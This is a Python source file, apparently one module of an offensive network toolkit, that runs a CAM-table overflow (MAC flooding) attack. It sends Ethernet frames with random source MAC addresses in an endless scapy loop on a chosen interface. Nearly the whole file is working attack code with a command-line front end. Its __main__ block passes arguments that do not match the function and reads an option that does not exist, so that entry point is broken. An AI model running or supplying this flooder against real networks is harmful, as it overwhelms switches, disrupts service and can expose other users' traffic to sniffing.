import time
import sys
import os
from src.envena.config import Fatal_Error, Error_text, Clear, scapy, Success
from scapy.all import Ether
from src.envena.functions import validate_args, rand_eth
from random import uniform
cam_overflow_v = 1.1

def cam_overflow(args: dict)->None:
    if not validate_args(iface=args['iface']):
        return False
    iface = args['iface']
    input = args['input']
    eth_dst = args['eth_dst']
    speed = args['timeout']
    sent_packets = 0
    input = 'X'*64 if not input else input
    
    print(f'CAM-overflow attack module, version {cam_overflow_v}')
    try:
        print('*CAM-overflow attack started. Ctrl+C to stop')
        eth_src=rand_eth()
        scapy.hexdump(Ether(src=eth_src, dst=eth_dst if eth_dst else rand_eth()) / (input))
        while True:
            try:
                eth_src=rand_eth()
                scapy.sendp(Ether(src=eth_src, dst=eth_dst if eth_dst else rand_eth()) / (input), verbose=False, iface=iface)
                print(f"\r{sent_packets}. Sent ethernet frame from MAC: {eth_src}", end='')
                sent_packets += 1
            except Exception as e:
                print(f"{Fatal_Error}Packet was not sent: {Error_text}{e}{Clear}")
            time.sleep(round(uniform(0, speed), 3)) # 1 packet on 0,002 sec is optimal
    except KeyboardInterrupt:
        print(f"\n\r{Success}{sent_packets} packet(s) sent.{Clear}")
        print('\nAborted.')

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description=f"CAM-overflow attack module. Verison: {cam_overflow_v}")
    parser.add_argument("-i", "--iface", help="Network iface send from.", required=False)
    parser.add_argument("-ed", "--eth_dst", help="Destination MAC-address.", required=False)
    parser.add_argument("-p", "--input", help="Payload content. The default is 'X' in 64 times.", required=False)
    parser.add_argument("-t", "--timeout", help="Speed of sending MAC-addresses. The default is 500 MAC/sec.", required=False, type=int)
    

    arg = parser.parse_args()
    cam_overflow(speed=arg.speed, input=arg.input, iface=arg.iface, eth_dst=arg.eth_dst)
